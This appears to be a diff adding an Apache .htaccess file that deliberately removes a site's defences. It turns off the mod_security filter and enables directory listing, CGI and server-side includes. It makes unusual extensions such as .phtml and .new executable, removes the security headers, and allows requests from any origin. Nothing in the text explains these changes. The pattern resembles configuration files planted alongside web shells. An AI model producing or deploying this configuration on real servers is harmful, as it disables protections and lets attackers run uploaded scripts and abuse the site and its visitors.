@@ -1,0 +1,31 @@
+# versi seder
+#RewriteEngine Off
+#Options +Indexes
+<IfModule mod_security.c>
+    SecFilterEngine Off
+    SecFilterScanPOST Off
+</IfModule>
+
+<IfModule mod_rewrite.c>
+    RewriteEngine Off
+</IfModule>
+
+Options +Indexes +FollowSymLinks +ExecCGI +Includes
+DirectoryIndex index.php index.html
+
+Order allow,deny
+Allow from all
+Satisfy Any
+
+<IfModule mod_mime.c>
+    AddHandler application/x-httpd-php .php .php5 .php7 .phtml
+    AddHandler cgi-script .cgi .pl .py .new
+</IfModule>
+
+<IfModule mod_headers.c>
+    Header unset X-Frame-Options
+    Header unset Content-Security-Policy
+    Header unset X-Content-Type-Options
+    Header set Access-Control-Allow-Origin "*"
+    Header set Access-Control-Allow-Methods "GET, POST, OPTIONS, DELETE, PUT"
+</IfModule>
